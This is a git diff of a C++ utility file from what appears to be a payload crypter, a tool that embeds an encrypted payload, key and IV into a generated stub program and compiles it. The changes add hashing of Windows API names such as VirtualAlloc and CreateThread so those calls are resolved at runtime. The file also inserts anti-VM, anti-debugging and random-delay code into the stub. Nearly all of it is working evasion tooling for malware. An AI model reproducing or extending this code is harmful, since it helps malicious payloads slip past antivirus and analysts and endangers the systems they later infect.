@@ -1,7 +1,9 @@
 // utils.cpp
 #include "utils.h"
 #include "flags.h"
+#include "placeholders.h"
 #include "constant.h"
+#include "stubstr.h"
 /**/
 
 
@@ -29,8 +31,6 @@ void setColor(int color) {
 void resetColor() {
     setColor(COLOR_DEFAULT);
 }
-
-
 
 string bytesToHexString(const vector<unsigned char> &bytes) {
     stringstream ss;
@@ -62,6 +62,16 @@ string generateRandomString(size_t length) {
     return randomString;
 }
 
+DWORD getHashFromString(const char *string){
+    size_t strlength = strnlen_s(string, 50);
+    DWORD hash = 0x35;
+
+    for(size_t i = 0; i < strlength; i++){
+        hash += (hash * 0xab10f29fa + string[i]) & 0xffffffa;
+    }
+
+    return hash;
+}
 // Returns bytes of binary
 vector<unsigned char> readBinary(string &path_to_payload) {
     ifstream file(path_to_payload, ios::binary | ios::ate);
@@ -166,12 +176,19 @@ vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<uns
 
     return plaintext;
 }
-void checkMismatch(){
-
+//
+void replaceAPICalls(std::string& line, const std::map<std::string, std::string>& replacements) {
+    for (const auto& pair : replacements) {
+        std::regex apiRegex("\\b" + pair.first + "\\b");
+        line = std::regex_replace(line, apiRegex, pair.second);
+    }
 }
 
+void writeStub(bool *flags, string &stub_name, string &stubTemplatePath, string &outputDirPath, const vector<unsigned char> &payloadBytes, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
+    setColor(COLOR_INFO);
+    cout << "\nWriting stub...\n";
+    resetColor();
 
-void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, const vector<unsigned char> &payloadBytes, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
     ifstream file(stubTemplatePath);
     if (!file) {
         setColor(COLOR_ERROR);
@@ -180,9 +197,17 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
         exit(1);
     }
     
-    string name = generateRandomString(8);
+    string name;
+    string outputPath;
     filesystem::create_directories(outputDirPath);
-    string outputPath = outputDirPath + "stub_" + name + ".cpp";
+
+    if(flags[NAME] == true){
+        name = stub_name;
+        outputPath = outputDirPath + "stub_" + name + ".cpp";
+    } else {
+        name = generateRandomString(8);
+        outputPath = outputDirPath + "stub_" + name + ".cpp";
+    }
 
     ofstream outputFile(outputPath);
     if (!outputFile) {
@@ -191,42 +216,187 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
         resetColor();
         exit(1);
     }
-    cout << "\n";
-
     
-    // Add flags that will be set for insertions
+    // Add flags that will be set for placeholders
     // since all flags require two separate replacements the original flags array cannot be used
-    bool insertions[INSERTION_COUNT] = {false};
+    bool placeholders[PLACEHOLDER_COUNT] = {false};
+    char *funNames[6];
+    vector<DWORD> hashes;
 
-    if(flags[RAND] == true){
-        insertions[RAND_DEF_POS] = true;
-        insertions[RAND_CALL_POS] = true;
+    if(flags[RAND]){
+        placeholders[RAND_DEF_POS] = true;
+        placeholders[RAND_CALL_POS] = true;
     }
-    if(flags[VM] == true){
-        insertions[VM_DEF_POS] = true;
-        insertions[VM_CALL_POS] = true;
+    if(flags[VM]){
+        placeholders[VM_DEF_POS] = true;
+        placeholders[VM_CALL_POS] = true;
     }
-    if(flags[DB] == true){
-        insertions[DB_DEF_POS] = true;
-        insertions[DB_CALL_POS] = true;
+    if(flags[DB]){
+        placeholders[DB_DEF_POS] = true;
+        placeholders[DB_CALL_POS] = true;
     }
-    if(flags[DYN] == true){
-        insertions[DYN_GLOBALS_POS] = true;
-        insertions[DYN_RESOLUTION_POS] = true;
+
+    string dwordArray;
+    if(flags[DYN]){
+        placeholders[API_CALLS_POS] = true;
+        placeholders[DYN_GLOBALS_POS] = true;
+        placeholders[DYN_CALL_POS] = true;
+
+        const char *funNames[] = {
+            "VirtualAlloc",
+            "VirtualFree",
+            "LoadLibraryA",
+            "CreateThread",
+            "WaitForSingleObject",
+            "CloseHandle"
+        };
+
+        vector<DWORD> hashes;
+        for(int i=0; i<6; i++){
+            hashes.push_back(getHashFromString(funNames[i]));
+        }
+
+        // Create a string representation of the DWORD array
+        dwordArray = "DWORD fun[] = {";
+        for (size_t i = 0; i < hashes.size(); ++i) {
+            dwordArray += "(DWORD)" + std::to_string(hashes[i]);
+            if (i < hashes.size() - 1) {
+                dwordArray += ", ";
+            }
+        }
+        dwordArray += "};";
+
+        size_t pos = DYN_GLOBALS.find("/*DWORD_ARRAY_PLACEHOLDER*/");
+        if (pos != std::string::npos) {
+            DYN_GLOBALS.replace(pos, strlen("/*DWORD_ARRAY_PLACEHOLDER*/"), dwordArray);
+        }
     }
 
 
     string line;
-    while (getline(file, line)) {
-        size_t pos;
+    vector<string> lines;
+    
+    // Copy stub template into memory 
+    while(getline(file,line)){
+        lines.push_back(line);
+    }
+    file.close();
 
+    // Process template depending on flags and write to new file
+    for(auto &line : lines){
+        size_t pos;
+        
         if (flags[PDB] == true){
             if ((pos = line.find("bool DEBUG = false;")) != string::npos) {
                 line.replace(pos, strlen("bool DEBUG = false;"), "bool DEBUG = true;");
             }  
+        } 
+
+        // Process --vm before --dyn in any case
+        if (flags[VM] == true) {
+            if (placeholders[VM_DEF_POS] == true) {
+                if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
+                    line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
+                    cout << "Set antiVM def successfully\n";
+                    placeholders[VM_DEF_POS] = false;
+                }
+            }
+            if (placeholders[VM_CALL_POS] == true) {
+                if ((pos = line.find("/*VM_CALL*/")) != string::npos) {
+                    line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
+                    cout << "Set antiVM call successfully\n";
+                    placeholders[VM_CALL_POS] = false;
+                }
+            }
+            if ((placeholders[VM_DEF_POS] == false) && (placeholders[VM_CALL_POS] == false)) {
+                flags[VM] = false;
+            }
         }
 
-        // Replace placeholders with actual values
+        // Replace all API calls defined here, that will be resolved dynamically
+        // VM_DEF uses CloseHandle, which is why it has to be processed before
+        // Has to be true every iteration when --dyn is used, so that every line
+        // can be checked for the API calls
+        if (placeholders[API_CALLS_POS] == true) {
+            map<string, string> replacements = {
+                {"VirtualAlloc", "pVirtualAlloc"},
+                {"VirtualFree", "pVirtualFree"},
+                {"LoadLibraryA", "pLoadLibraryA"},
+                {"CreateThread", "pCreateThread"},
+                {"WaitForSingleObject", "pWaitForSingleObject"},
+                {"CloseHandle", "pCloseHandle"}
+            };
+
+            map<string, string> hashReplacements = {
+                {"VirtualAlloc", "VA"},
+                {"VirtualFree", "VF"},
+                {"LoadLibraryA", "LLA"},
+                {"CreateThread", "CT"},
+                {"WaitForSingleObject", "WFO"},
+                {"CloseHandle", "CH"}
+            };
+
+            replaceAPICalls(line, hashReplacements);
+            // Since every line has to be checked this has to stay false 
+            //placeholders[API_CALLS_POS] = false;
+        }
+
+        if (flags[DYN] == true) {
+            if (placeholders[DYN_GLOBALS_POS]) {
+                if ((pos = line.find("/*DYN_GLOBALS*/")) != string::npos) {
+                    line.replace(pos, strlen("/*DYN_GLOBALS*/"), DYN_GLOBALS);
+                    cout << "Set dynamic API resolution globals successfully\n";
+                    placeholders[DYN_GLOBALS_POS] = false;
+                }
+            }
+            if (placeholders[DYN_CALL_POS]) {
+                if ((pos = line.find("/*DYN_CALL*/")) != string::npos) {
+                    line.replace(pos, strlen("/*DYN_CALL*/"), DYN_CALL);
+                    cout << "Set dynamic API resolution initialization successfully\n";
+                    placeholders[DYN_CALL_POS] = false;
+                }
+            }
+            if ((placeholders[DYN_GLOBALS_POS] == false) && (placeholders[DYN_CALL_POS] == false)) {
+                flags[DYN] = false;
+            }
+        }
+
+        if (flags[RAND] == true){
+            if(placeholders[RAND_DEF_POS] == true){
+                if ((pos = line.find("/*RAND_DEF*/")) != string::npos) {
+                    line.replace(pos, strlen("/*RAND_DEF*/"), RAND_DEF);
+                    cout << "Set rand def successfully\n";
+                }
+            }
+            if(placeholders[RAND_CALL_POS] == true){
+                if ((pos = line.find("execute(payload);")) != string::npos) {
+                    line.replace(pos, strlen("execute(payload);"), RAND_CALL);
+                    cout << "Set rand call successfully\n";
+                }
+            }
+            if((placeholders[RAND_DEF_POS] == false) && (placeholders[RAND_CALL_POS] == false)){
+                flags[RAND] = false;
+            }
+        }
+
+        if (flags[DB] == true){
+            if(placeholders[DB_DEF_POS] == true){
+                if ((pos = line.find("/*DB_DEF*/")) != string::npos) {
+                    line.replace(pos, strlen("/*DB_DEF*/"), DB_DEF);
+                    cout << "Set antiDB def successfully\n";
+                }
+            }
+            if(placeholders[DB_CALL_POS] == true){
+                if ((pos = line.find("/*DB_CALL*/")) != string::npos) {
+                    line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
+                    cout << "Set antiDB call successfully\n";
+                }
+            }
+            if((placeholders[DB_CALL_POS] == false) && (placeholders[DB_DEF_POS] == false)){
+                flags[DB] = false;
+            }
+        }
+
         if ((pos = line.find("/*ENCRYPTED_BYTES*/")) != string::npos) {
             line.replace(pos, strlen("/*ENCRYPTED_BYTES*/"), bytesToHexString(payloadBytes));
         }
@@ -237,110 +407,17 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
             line.replace(pos, strlen("/*IV*/"), bytesToHexString(iv));
         } 
 
-        // Check dynamic API resolution flag first so that anti vm api calls dont get updated in the case that both flags are set 
-        if(flags[DYN] == true){
-        
-            // Replacing the API calls in execute() before the dynamic resolution logic is added, since the init needs 
-            // LoadLibaryA to load kernel32.dll
-            line = regex_replace(line, regex("\\bVirtualAlloc\\b"), "pVirtualAlloc");
-            line = regex_replace(line, regex("\\bVirtualFree\\b"), "pVirtualFree");
-            line = regex_replace(line, regex("\\bLoadLibraryA\\b"), "pLoadLibraryA");
-            line = regex_replace(line, regex("\\bGetProcAddress\\b"), "pGetProcAddress");
-            line = regex_replace(line, regex("\\bCreateThread\\b"), "pCreateThread");
-            line = regex_replace(line, regex("\\bWaitForSingleObject\\b"), "pWaitForSingleObject");
-            line = regex_replace(line, regex("\\bCloseHandle\\b"), "pCloseHandle");
-        
-            if(insertions[DYN_GLOBALS_POS]){
-                if ((pos = line.find("/*DYN_GLOBALS*/")) != string::npos) {
-                    line.replace(pos, strlen("/*DYN_GLOBALS*/"), DYN_GLOBALS);
-                    cout << "Set dynamic API resolution globals successfully\n";
-                    insertions[DYN_GLOBALS_POS] = false;
-                }
-            }
-            if (insertions[DYN_RESOLUTION_POS]){
-                if ((pos = line.find("/*DYN_RESOLUTION*/")) != string::npos) {
-                    line.replace(pos, strlen("/*DYN_RESOLUTION*/"), DYN_RESOLUTION);
-                    cout << "Set dynamic API resolution initialization successfully\n";
-                    insertions[DYN_RESOLUTION_POS] = false;
-                }
-            }
-
-            if((insertions[DYN_GLOBALS_POS] == false) && (insertions[DYN_RESOLUTION_POS] == false)){
-                flags[DYN] = false;
-            }
-        }
-
-        if (flags[RAND] == true){
-
-            if(insertions[RAND_DEF_POS] == true){
-                if ((pos = line.find("/*RAND_DEF*/")) != string::npos) {
-                    line.replace(pos, strlen("/*RAND_DEF*/"), RAND_DEF);
-                    cout << "Set rand def successfully\n";
-                }
-            }
-            if(insertions[RAND_CALL_POS] == true){
-                if ((pos = line.find("execute(payload);")) != string::npos) {
-                    line.replace(pos, strlen("execute(payload);"), RAND_CALL);
-                    cout << "Set rand call successfully\n";
-                }
-            }
-
-            // dictionary in resource
-            // choose random selection of words and populate large vector
-            
-            if((insertions[RAND_DEF_POS] == false) && (insertions[RAND_CALL_POS] == false)){
-                flags[RAND] = false;
-            }
-        }
-        
-        if (flags[VM] == true){
-            if(insertions[VM_DEF_POS] == true){
-                if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
-                    line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
-                    cout << "Set antiVM def successfully\n";
-                }
-            }
-            if(insertions[VM_CALL_POS] == true){
-                if ((pos = line.find("/*VM_CALL*/")) != string::npos) {
-                    line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
-                    cout << "Set antiVM call successfully\n";
-                }
-            }
-            if((insertions[VM_DEF_POS] == false) && (insertions[VM_CALL_POS] == false)){
-                flags[VM] = false;
-            }
-        }
-
-        if (flags[DB] == true){
-            if(insertions[DB_DEF_POS] == true){
-                if ((pos = line.find("/*DB_DEF*/")) != string::npos) {
-                    line.replace(pos, strlen("/*DB_DEF*/"), DB_DEF);
-                    cout << "Set antiDB def successfully\n";
-                }
-            }
-            if(insertions[DB_CALL_POS] == true){
-                if ((pos = line.find("/*DB_CALL*/")) != string::npos) {
-                    line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
-                    cout << "Set antiDB call successfully\n";
-                }
-            }
-            if((insertions[DB_CALL_POS] == false) && (insertions[DB_DEF_POS] == false)){
-                flags[DB] = false;
-            }
-        }
-        
         outputFile << line << endl;
     }
-
-    // Check global arg flag and internal flag mismatches
-    file.close();
     outputFile.close();
 
+    setColor(COLOR_SUCCESS);
     cout << "Successfully wrote stub to: " << outputPath << "\n";
+    resetColor();
 
     if(flags[COMPILE] == true){
         setColor(COLOR_INFO);
-        cout << "Compiling stub...\n";
+        cout << "\nCompiling stub...\n";
         string tmp = "make out/stub_" + name + ".exe";
         const char *command = tmp.c_str();
 
@@ -355,7 +432,7 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
             resetColor();
             exit(1);
         }
-
     }
+    
     resetColor();
 }
